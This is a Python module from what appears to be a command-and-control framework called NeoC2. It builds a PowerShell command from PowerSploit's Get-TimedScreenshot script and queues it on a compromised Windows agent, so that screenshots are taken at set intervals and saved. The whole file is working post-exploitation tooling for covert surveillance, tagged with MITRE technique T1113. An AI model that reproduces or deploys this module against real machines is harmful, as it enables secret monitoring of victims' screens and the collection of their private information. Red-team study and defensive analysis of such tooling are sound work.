# modules/screenshot.py
import os
import importlib.util
import base64
import re


def get_info():
    """Get module information"""
    return {
        "name": "screenshot",
        "description": "Execute a PowerShell timed screenshot capture that saves screenshots to a specified path",
        "type": "post-exploitation",
        "platform": "windows",
        "author": "NeoC2 Framework",
        "references": ["https://github.com/PowerShellMafia/PowerSploit"],
        "technique_id": "T1113,T1059.001",
        "mitre_tactics": ["Collection"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run the screenshot capture on",
                "required": True
            },
            "path": {
                "description": "Path where screenshots will be saved (default: %TEMP%)",
                "required": False,
                "default": "%TEMP%"
            },
            "interval": {
                "description": "Interval in seconds between taking screenshots (default: 30)",
                "required": False,
                "default": "30"
            },
            "end_time": {
                "description": "Time when the script should stop running (format: HH:MM, e.g., 14:00)",
                "required": False,
                "default": "23:59"
            },

        }
    }


def execute(options, session):
    """Execute the screenshot module with given options and session"""
    agent_id = options.get("agent_id")
    path = options.get("path", "%TEMP%")
    interval = options.get("interval", "30")
    end_time = options.get("end_time", "23:59")
    
    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }
    
    try:
        interval_int = int(interval)
        if interval_int <= 0:
            return {
                "success": False,
                "error": f"Invalid interval: {interval}. Must be a positive integer"
            }
    except ValueError:
        return {
            "success": False,
            "error": f"Invalid interval: {interval}. Must be a positive integer"
        }
    
    # Validate end_time format (HH:MM)
    if not re.match(r'^\d{2}:\d{2}$', end_time):
        return {
            "success": False,
            "error": f"Invalid end_time format: {end_time}. Must be in HH:MM format (e.g. 14:00)"
        }
    
    # Validate path for potential command injection
    # Only allow alphanumeric characters, spaces, and common path characters
    if not re.match(r'^[a-zA-Z0-9_\-\\\/:%.~\s]+$', path):
        return {
            "success": False,
            "error": f"Invalid path: {path}. Contains invalid characters."
        }
    
    # Set the current agent in the session
    session.current_agent = agent_id
    

    
    # Read the original Get-TimedScreenshot.ps1 script
    script_path = os.path.join(os.path.dirname(__file__), 'external', 'Get-TimedScreenshot.ps1')
    try:
        with open(script_path, 'r', encoding='utf-8') as f:
            original_script = f.read()
    except FileNotFoundError:
        return {
            "success": False,
            "error": f"Could not find screenshot script at {script_path}"
        }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error reading screenshot script: {str(e)}"
        }
    
    # Build the execution command with parameters
    execution_command = f'{original_script}\nGet-TimedScreenshot -Path "{path}" -Interval {interval_int} -EndTime "{end_time}"'
    
    # Return the execution command - the agent will handle PowerShell execution and base64 encoding
    powershell_command = execution_command
    
    # Check if session has a valid agent_manager
    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }
    
    # Queue the task on the agent
    try:
        agent_manager = session.agent_manager
        task_id = agent_manager.add_task(agent_id, powershell_command)
        if task_id:
            return {
                "success": True,
                "output": f"Screenshot task {task_id} queued for agent {agent_id}",
                "task_id": task_id,
                "path": path,
                "interval": interval_int,
                "end_time": end_time
            }
        else:
            return {
                "success": False,
                "error": f"Failed to queue task for agent {agent_id}"
            }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error queuing task: {str(e)}"
        }